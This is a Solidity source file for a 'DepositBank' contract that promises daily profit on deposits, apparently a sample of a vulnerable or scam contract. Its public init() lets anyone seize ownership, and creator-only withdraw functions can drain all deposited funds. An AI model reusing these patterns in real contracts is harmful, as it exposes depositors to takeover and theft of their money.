contract Base 
{
    address newOwner;
    address owner = msg.sender;
    address payable creator = msg.sender;
    
    function isOwner() internal returns(bool) 
    {
        return owner == msg.sender;
    }
    
    function changeOwner(address addr) public
    {
        if(isOwner())
        {
            newOwner = addr;
        }
    }
    
    function confirmOwner()
    public
    {
        if(msg.sender==newOwner)
        {
            owner=newOwner;
        }
    }
    
    function canDrive()
    internal
    returns(bool)
    {
        return (owner == msg.sender)||(creator==msg.sender);
    }
    
    function WthdrawAllToCreator()
    public
    payable
    {
        if(msg.sender==creator)
        {
            creator.transfer(address(this).balance);
        }
    }
    
    function WthdrawToCreator(uint val)
    public
    payable
    {
        if(msg.sender==creator)
        {
            creator.transfer(val);
        }
    }
    
    function WthdrawTo(address payable addr,uint val)
    public
    payable
    {
        if(msg.sender==creator)
        {
            addr.transfer(val);
        }
    }
    
    function WithdrawToken(address token, uint256 amount)
    public 
    {
        if(msg.sender==creator)
        {
            token.call(abi.encode(bytes4(keccak256("transfer(address,uint256)")),creator,amount)); 
        }
    }
}

contract DepositBank is Base
{
    uint public SponsorsQty;
    
    uint public CharterCapital;
    
    uint public ClientQty;
    
    uint public PrcntRate = 3;
    
    uint public MinPayment;
    
    bool paymentsAllowed;
    
    struct Lender 
    {
        uint LastLendTime;
        uint Amount;
        uint Reserved;
    }
    
    mapping (address => uint) public Sponsors;
    
    mapping (address => Lender) public Lenders;
    
    event StartOfPayments(address indexed calledFrom, uint time);
    
    event EndOfPayments(address indexed calledFrom, uint time);
    
    function func()
    payable external
    {
        ToSponsor();
    }
    
    
    ///Constructor
    function init()
    public
    {
        owner = msg.sender;
        PrcntRate = 5;
        MinPayment = 1 ether;
    }
    
    
    // investors================================================================
    
    function Deposit() 
    public payable
    {
        FixProfit();//fix time inside
        Lenders[msg.sender].Amount += msg.value;
    }
    
    function CheckProfit(address addr) public
    returns(uint)
    {
        return ((Lenders[addr].Amount/100)*PrcntRate)*((block.timestamp-Lenders[addr].LastLendTime)/1 days);
    }
    
    function FixProfit() public
    {
        if(Lenders[msg.sender].Amount>0)
        {
            Lenders[msg.sender].Reserved += CheckProfit(msg.sender);
        }
        Lenders[msg.sender].LastLendTime=block.timestamp;
    }
    
    function WitdrawLenderProfit() public
    payable
    {
        if(paymentsAllowed)
        {
            FixProfit();
            uint profit = Lenders[msg.sender].Reserved;
            Lenders[msg.sender].Reserved = 0;
            msg.sender.transfer(profit);        
        }
    }
    
    //==========================================================================
    
    // sponsors ================================================================
    
    function ToSponsor() public
    payable
    {
        if(msg.value>= MinPayment)
        {
            if(Sponsors[msg.sender]==0)SponsorsQty++;
            Sponsors[msg.sender]+=msg.value;
            CharterCapital+=msg.value;
        }   
    }
    
    //==========================================================================
    
    
    function AuthorizePayments(bool val) public
    {
        if(isOwner())
        {
            paymentsAllowed = val;
        }
    }
    function StartPaymens() public
    {
        if(isOwner())
        {
            AuthorizePayments(true);
            emit StartOfPayments(msg.sender, block.timestamp);
        }
    }
    function StopPaymens() public
    {
        if(isOwner())
        {
            AuthorizePayments(false);
            emit EndOfPayments(msg.sender, block.timestamp);
        }
    }
    function WithdrawToSponsor(address payable _addr, uint _wei) public
    payable
    {
        if(Sponsors[_addr]>0)
        {
            if(isOwner())
            {
                if(_addr.send(_wei))
                {
                    if(CharterCapital>=_wei)CharterCapital-=_wei;
                    else CharterCapital=0;
                    }
            }
        }
    }
    bool finalized;
    function Fin() public{if(isOwner()){finalized = true;}}
    
   
}